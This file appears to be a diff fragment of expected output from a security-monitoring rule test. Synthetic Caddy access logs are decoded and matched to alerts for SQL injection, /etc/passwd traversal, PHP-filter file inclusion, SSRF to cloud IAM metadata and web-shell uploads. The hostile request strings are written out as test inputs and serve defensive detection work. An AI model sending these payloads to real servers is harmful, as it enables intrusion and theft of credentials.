+	mitre.tactic: '['Discovery']'
+	mitre.technique: '['File and Directory Discovery']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976205.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.23","remote_port":"55005","client_ip":"10.0.0.23","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/confidential-file","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.23'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.23'
+	request.remote_port: '55005'
+	request.uri: '/confidential-file'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976205'
+
+**Phase 3: Completed filtering (rules).
+	id: '996020'
+	level: '8'
+	description: 'Caddy: Request for suspicious filename from 10.0.0.23 - /confidential-file'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '3'
+	mail: 'False'
+	mitre.id: '['T1083']'
+	mitre.tactic: '['Discovery']'
+	mitre.technique: '['File and Directory Discovery']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976051.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.99","remote_port":"55099","client_ip":"10.0.0.99","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/?id=1%27%20OR%20%271%27%3D%271","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.99'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.99'
+	request.remote_port: '55099'
+	request.uri: '/?id=1%27%20OR%20%271%27%3D%271'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976051'
+
+**Phase 3: Completed filtering (rules).
+	id: '996004'
+	level: '10'
+	description: 'Caddy: SQL injection attempt from 10.0.0.99'
+	groups: '['caddy', 'web', 'web', 'attack', 'sql_injection']'
+	firedtimes: '3'
+	mail: 'False'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976300.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.50","remote_port":"60000","client_ip":"10.0.0.50","proto":"HTTP/1.1","method":"POST","host":"localhost:8080","uri":"/login","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":401,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.50'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'POST'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.50'
+	request.remote_port: '60000'
+	request.uri: '/login'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '401'
+	ts: '1781976300'
+
+**Phase 3: Completed filtering (rules).
+	id: '996021'
+	level: '3'
+	description: 'Caddy: Authentication endpoint access from 10.0.0.50'
+	groups: '['caddy', 'web', 'web', 'authentication']'
+	firedtimes: '2'
+	mail: 'False'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980001.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.1","remote_port":"60001","client_ip":"10.1.0.1","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/..%c0%ae/etc/passwd","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.1'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.1'
+	request.remote_port: '60001'
+	request.uri: '/..%c0%ae/etc/passwd'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980001'
+
+**Phase 3: Completed filtering (rules).
+	id: '996023'
+	level: '10'
+	description: 'Caddy: Encoding evasion / WAF bypass attempt from 10.1.0.1'
+	groups: '['caddy', 'web', 'web', 'attack', 'evasion']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1027']'
+	mitre.tactic: '['Defense Evasion']'
+
+
+	mitre.technique: '['Obfuscated Files or Information']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980002.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.2","remote_port":"60002","client_ip":"10.1.0.2","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/page?file=php://filter/convert.base64-encode/resource=index.php","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.2'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.2'
+	request.remote_port: '60002'
+	request.uri: '/page?file=php://filter/convert.base64-encode/resource=index.php'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980002'
+
+**Phase 3: Completed filtering (rules).
+	id: '996024'
+	level: '12'
+	description: 'Caddy: LFI/RFI file inclusion attempt from 10.1.0.2 - /page?file=php://filter/convert.base64-encode/resource=index.php'
+	groups: '['caddy', 'web', 'web', 'attack', 'lfi']'
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+
+
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980003.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.3","remote_port":"60003","client_ip":"10.1.0.3","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.3'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.3'
+	request.remote_port: '60003'
+	request.uri: '/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980003'
+
+**Phase 3: Completed filtering (rules).
+	id: '996025'
+	level: '12'
+	description: 'Caddy: SSRF attempt targeting internal resource from 10.1.0.3 - /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+	groups: '['caddy', 'web', 'web', 'attack', 'ssrf']'
+
+
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1090']'
+	mitre.tactic: '['Command and Control']'
+	mitre.technique: '['Proxy']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980004.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.4","remote_port":"60004","client_ip":"10.1.0.4","proto":"HTTP/1.1","method":"POST","host":"localhost:8080","uri":"/graphql?query=__schema{types{name}}","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.4'
+	request.headers.Accept: '['*/*']'
+
+
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'POST'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.4'
+	request.remote_port: '60004'
+	request.uri: '/graphql?query=__schema{types{name}}'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980004'
+
+**Phase 3: Completed filtering (rules).
+	id: '996026'
+	level: '8'
+	description: 'Caddy: GraphQL introspection or API schema probe from 10.1.0.4'
+	groups: '['caddy', 'web', 'web', 'recon', 'api']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1595.002']'
+	mitre.tactic: '['Reconnaissance']'
+	mitre.technique: '['Vulnerability Scanning']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980005.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.5","remote_port":"60005","client_ip":"10.1.0.5","proto":"HTTP/1.1","method":"DEBUG","host":"localhost:8080","uri":"/","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.5'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'DEBUG'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.5'
+	request.remote_port: '60005'
+	request.uri: '/'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980005'
+
+**Phase 3: Completed filtering (rules).
+	id: '996027'
+	level: '8'
+	description: 'Caddy: Unusual or dangerous HTTP method from 10.1.0.5 - DEBUG'
+	groups: '['caddy', 'web', 'web', 'attack', 'protocol_abuse']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+
+
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980006.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.6","remote_port":"60006","client_ip":"10.1.0.6","proto":"HTTP/1.1","method":"POST","host":"localhost:8080","uri":"/uploads/shell.php","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.6'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'POST'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.6'
+	request.remote_port: '60006'
+	request.uri: '/uploads/shell.php'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980006'
+
+**Phase 3: Completed filtering (rules).
+	id: '996029'
+	level: '12'
+	description: 'Caddy: Dangerous file upload attempt from 10.1.0.6 - /uploads/shell.php'
+	groups: '['caddy', 'web', 'web', 'attack', 'upload']'
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980006.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.6","remote_port":"60006","client_ip":"10.1.0.6","proto":"HTTP/1.1","method":"POST","host":"localhost:8080","uri":"/uploads/script.py","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.6'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'POST'
+
+
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.6'
+	request.remote_port: '60006'
+	request.uri: '/uploads/script.py'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980006'
+
+**Phase 3: Completed filtering (rules).
+	id: '996029'
+	level: '12'
+	description: 'Caddy: Dangerous file upload attempt from 10.1.0.6 - /uploads/script.py'
+	groups: '['caddy', 'web', 'web', 'attack', 'upload']'
+	firedtimes: '2'
+	mail: 'True'
+
+
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980007.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.1.0.7","remote_port":"60007","client_ip":"10.1.0.7","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/search?q=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+
+
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.1.0.7'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.1.0.7'
+	request.remote_port: '60007'
+	request.uri: '/search?q=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980007'
+
+**Phase 3: Completed filtering (rules).
+	id: '996030'
+	level: '8'
+	description: 'Caddy: Oversized URI detected from 10.1.0.7 - possible fuzzing'
+	groups: '['caddy', 'web', 'web', 'recon', 'scan']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1595.002']'
+	mitre.tactic: '['Reconnaissance']'
+	mitre.technique: '['Vulnerability Scanning']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980010.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.2.0.1","remote_port":"60010","client_ip":"10.2.0.1","proto":"HTTP/1.1","method":"POST","host":"localhost:8080","uri":"/uploads/shell.php.jpg","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.2.0.1'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'POST'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.2.0.1'
+	request.remote_port: '60010'
+	request.uri: '/uploads/shell.php.jpg'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980010'
+
+**Phase 3: Completed filtering (rules).
+	id: '996031'
+	level: '13'
+	description: 'Caddy: Double extension bypass upload attempt from 10.2.0.1 - /uploads/shell.php.jpg'
+	groups: '['caddy', 'web', 'web', 'attack', 'upload', 'evasion']'
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+
+
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781980011.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.2.0.2","remote_port":"60011","client_ip":"10.2.0.2","proto":"HTTP/1.1","method":"POST","host":"localhost:8080","uri":"/uploads/malware.docm","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.2.0.2'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'POST'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.2.0.2'
+	request.remote_port: '60011'
+	request.uri: '/uploads/malware.docm'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781980011'
+
+**Phase 3: Completed filtering (rules).
+	id: '996032'
+	level: '8'
+	description: 'Caddy: Archive or macro-enabled file upload from 10.2.0.2 - /uploads/malware.docm'
+	groups: '['caddy', 'web', 'web', 'recon', 'upload']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1566.001']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Spearphishing Attachment']'
+**Alert to be generated.
+
